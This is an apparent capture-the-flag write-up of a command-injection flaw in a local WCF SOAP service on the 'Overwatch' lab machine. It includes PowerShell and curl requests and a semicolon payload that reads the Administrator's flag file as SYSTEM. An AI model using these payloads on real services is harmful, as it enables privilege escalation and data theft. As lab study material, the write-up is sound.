exploits/wcf-soap-injection.md

# WCF SOAP Command Injection

Used on: **Overwatch**

A custom .NET WCF service listens on `http://localhost:8000/MonitorService` and exposes a `KillProcess` operation. The `processName` element is concatenated into a shell invocation without sanitization, so appending `;<command>` executes arbitrary commands under the service account (SYSTEM in this case).

## Discover the Service

```powershell
netstat -ano | findstr ":8000"
Get-Process -Id (Get-NetTCPConnection -LocalPort 8000 -ErrorAction SilentlyContinue).OwningProcess
```

See `nssm-service-abuse.md` for locating the wrapped binary (`C:\Software\Monitoring\...`).

## Probe: Kill notepad

```powershell
Start-Process notepad -WindowStyle Hidden

$killSoap = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
"@

Invoke-RestMethod -Uri "http://localhost:8000/MonitorService" `
  -Method Post -ContentType "text/xml; charset=utf-8" `
  -Body $killSoap `
  -Headers @{ "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess" }
```

Notepad disappears → confirms the parameter reaches a process-kill command.

## Exploit: Semicolon Injection

```xml
<processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>
```

The service executes `notepad` **and then** `type C:\...\root.txt`, echoing the flag back in the SOAP response.

### curl version

```bash
curl.exe -X POST http://127.0.0.1:8000/MonitorService `
  -H "Content-Type: text/xml; charset=utf-8" `
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" `
  -d "<?xml version='1.0' encoding='utf-8'?>
<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
  xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
  <soap:Body>
    <KillProcess xmlns='http://tempuri.org/'>
      <processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>"
```

## Why It Worked as SYSTEM

The service was wrapped by NSSM with `ObjectName = LocalSystem`. Every injected command inherits SYSTEM privileges — no separate escalation needed.
